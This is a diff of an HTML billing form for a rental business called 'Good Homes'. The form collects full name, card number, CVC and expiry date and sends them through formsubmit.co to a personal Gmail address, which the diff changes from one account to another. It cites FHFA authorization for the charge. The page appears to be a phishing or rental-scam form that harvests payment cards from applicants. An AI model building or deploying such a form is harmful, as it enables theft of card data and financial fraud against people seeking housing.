@@ -181,15 +181,13 @@
     </nav>
   </header>
 
-   <form action="https://formsubmit.co/goodhome267@gmail.com" method="POST"> 
-
   <div class="hero">
     <h1>Billing Information</h1>
   </div>
 
   <div class="form-container">
-    <h2>Enter Your Billing Details</h2> 
-      
+    <h2>Enter Your Billing Details</h2>
+    <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST">
       <input type="hidden" name="_next" value="thank-you.html">
       <input type="hidden" name="_subject" value="New Billing Information Submission">
       <label for="full-name">Full Name</label>
@@ -199,7 +197,7 @@
       <input type="text" id="card-number" name="card-number" pattern="\d{16}" placeholder="XXXXXXXXXXXXXXXX" required>
 
       <label for="cvc">CVC</label>
-      <input type="text" id="cvc" name="cvc" pattern="\d{3,4}" placeholder="XXX" required>
+      <input type="text" id="cvc" name="cvc" pattern="\d{3}" placeholder="XXX" required>
 
       <label for="expiry-date">Expiry Date</label>
       <input type="text" id="expiry-date" name="expiry-date" pattern="\d{2}/\d{2}" placeholder="MM/YY" required>
@@ -214,10 +212,6 @@
         <input type="checkbox" id="authorization" name="authorization" required>
         <label for="authorization">I accept the authorization given to Good Homes by FHFA to charge the amount for my rental application.</label>
       </div>
-
-      <input type="hidden" name="_captcha" value="false">  
-      <input type="hidden" name="_template" value="table">  
-      <input type="hidden" name="_next" value="https://goodhomesrentals.github.io/rentalapplication/thank-you.html">  
 
       <button type="submit"><i class="fas fa-paper-plane"></i> Submit Billing Info</button>
     </form>
